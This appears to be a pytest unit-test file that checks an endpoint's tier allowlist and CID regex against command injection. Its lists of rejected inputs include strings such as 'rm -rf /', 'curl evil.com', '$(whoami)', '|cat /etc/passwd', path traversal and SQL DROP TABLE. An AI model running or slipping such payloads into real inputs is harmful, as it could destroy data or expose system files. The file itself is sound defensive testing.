"""Unit tests for sovereignty endpoint input sanitization.

Verifies that user-controlled values (tier, cid) are validated before
being interpolated into command strings passed to agent.process_input().
"""
import re
import pytest

from endpoints.sovereignty import ALLOWED_TIERS, CID_PATTERN


class TestTierValidation:
    """Tests for tier allowlist validation."""

    def test_allowed_tiers_contains_expected_values(self):
        """Allowlist includes all valid storage tiers."""
        assert "local" in ALLOWED_TIERS
        assert "ipfs" in ALLOWED_TIERS
        assert "filecoin" in ALLOWED_TIERS

    def test_allowed_tiers_rejects_unknown(self):
        """Unknown tiers are not in the allowlist."""
        assert "arweave" not in ALLOWED_TIERS
        assert "s3" not in ALLOWED_TIERS
        assert "" not in ALLOWED_TIERS

    def test_tier_injection_blocked(self):
        """Command injection via tier parameter is blocked."""
        malicious_tiers = [
            "ipfs; rm -rf /",
            "ipfs && curl evil.com",
            "ipfs\n!delete-all",
            "local --extra-flag",
            "'; DROP TABLE users; --",
            "ipfs$(whoami)",
        ]
        for malicious in malicious_tiers:
            assert malicious not in ALLOWED_TIERS, f"Should block: {malicious}"


class TestCIDValidation:
    """Tests for CID format validation."""

    def test_valid_cidv0(self):
        """CIDv0 (Qm...) format passes validation."""
        assert CID_PATTERN.match("QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG")

    def test_valid_cidv1(self):
        """CIDv1 (bafy...) format passes validation."""
        assert CID_PATTERN.match("bafybeigdyrzt5sfp7udm7hu76uh7y26nf3efuylqabf3oclgtqy55fbzdi")

    def test_rejects_empty_string(self):
        """Empty string fails CID validation."""
        assert not CID_PATTERN.match("")

    def test_rejects_spaces(self):
        """CID with spaces is rejected."""
        assert not CID_PATTERN.match("Qm abc123")

    def test_rejects_shell_injection(self):
        """Shell metacharacters in CID are rejected."""
        malicious_cids = [
            "Qmabc; rm -rf /",
            "Qmabc && curl evil.com",
            "Qmabc\n!delete-all",
            "$(whoami)",
            "Qmabc|cat /etc/passwd",
            "Qmabc`id`",
            "../../../etc/passwd",
            "Qmabc --flag=value",
        ]
        for malicious in malicious_cids:
            assert not CID_PATTERN.match(malicious), f"Should reject: {malicious}"

    def test_accepts_alphanumeric_only(self):
        """Only purely alphanumeric strings pass."""
        assert CID_PATTERN.match("abc123DEF456")
        assert CID_PATTERN.match("QmValidCID12345")
        assert not CID_PATTERN.match("abc-123")
        assert not CID_PATTERN.match("abc_123")
        assert not CID_PATTERN.match("abc/123")
